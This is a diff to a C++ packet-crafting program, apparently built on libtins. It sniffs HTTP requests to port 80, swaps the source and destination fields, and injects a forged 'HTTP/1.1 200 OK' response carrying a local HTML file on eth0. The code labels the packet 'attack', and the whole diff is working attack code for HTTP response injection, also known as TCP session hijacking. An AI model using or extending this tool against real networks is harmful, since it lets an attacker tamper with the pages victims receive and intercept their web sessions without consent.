@@ -19,7 +19,11 @@ struct pk_set
     int count = 0;
     void image_f()
     {
-        FILE *fp = fopen("/home/han/Pictures/death.jpg","rb");
+        string path;
+        cout<<"image path :";
+        //cin>>path;
+        //FILE *fp = fopen(path.c_str(),"rb");
+        FILE *fp = fopen("/var/www/html/test.html","rb");
         fseek(fp,0,SEEK_END);//moving list array
         len = ftell(fp);
         cout<<len<<endl;
@@ -58,7 +62,7 @@ struct pk_set
         cout<<"tcp Check sum :"<<tcp.checksum()<<"\n";
     }
 
-    void pk_swap(EthernetII ethernet, IP ip, TCP tcp,int check)
+    bool pk_swap(EthernetII ethernet, IP ip, TCP tcp)
     {
 
         //swap
@@ -71,10 +75,9 @@ struct pk_set
         //swap
         new_tcp.sport(tcp.dport());
         new_tcp.dport(tcp.sport());
-        if(check == 1)
-            new_tcp.flags(0x18) ;
-        else
-            new_tcp.flags(0x10) ;
+        new_tcp.flags(0x18);
+        return true;
+
     }
 
 
@@ -88,9 +91,8 @@ struct pk_set
 
     void chg_send()
     {
-
         fprintf(stderr, "bef sending 111\n");
-        EthernetII attack = new_ethernet / new_ip / new_tcp / RawPDU((const uint8_t *)image,len);
+        EthernetII attack = new_ethernet / new_ip / new_tcp /RawPDU("HTTP/1.1 200 OK\r\n\r\n")/ RawPDU((const uint8_t *)image, len);
         sender.send(attack, "eth0");
         fprintf(stderr, "Attack..");
         cout<<"send Debug\n";
@@ -107,9 +109,9 @@ struct pk_set
         if(tcp.ACK == 0x10 && tcp.PSH == 0x08 && tcp.dport() == 0x50)
         {
             const RawPDU::payload_type& payload = raw.payload();
-            pk_swap(ethernet,ip,tcp,1);
+            pk_swap(ethernet,ip,tcp);
             tcp_caculator(tcp,payload.size());
-            chg_send();
+           chg_send();
             cout<<"request packet "<<"\n";
             cout<<payload.data()<<"\n";
             debug(ethernet,ip,tcp);
